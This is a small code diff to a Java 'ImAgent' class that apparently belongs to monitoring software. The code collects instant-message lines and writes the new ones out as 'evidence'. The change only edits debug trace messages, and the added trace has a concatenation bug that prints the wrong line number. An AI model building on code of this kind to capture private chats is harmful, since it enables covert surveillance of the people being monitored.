@@ -235,7 +235,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
         for (lastEqual = lines.size() - 1; lastEqual >= 0; lastEqual--) {
             if (lines.elementAt(lastEqual).equals(lastLine)) {
                 //#ifdef DEBUGs
-                debug.trace("add found: " + lastEqual);
+                debug.trace("add found equal at line: " + lastEqual);
                 //#endif
                 break;
             }
@@ -255,6 +255,9 @@ public final class ImAgent extends Agent implements BacklightObserver,
             //#endif
 
             serialize(partecipants, lastLine);
+            //#ifdef DEBUG
+            debug.trace("write evidence from line: " + lastEqual +1);
+            //#endif
             writeEvidence(partecipants, lines, lastEqual + 1);
 
             //#ifdef DEBUG
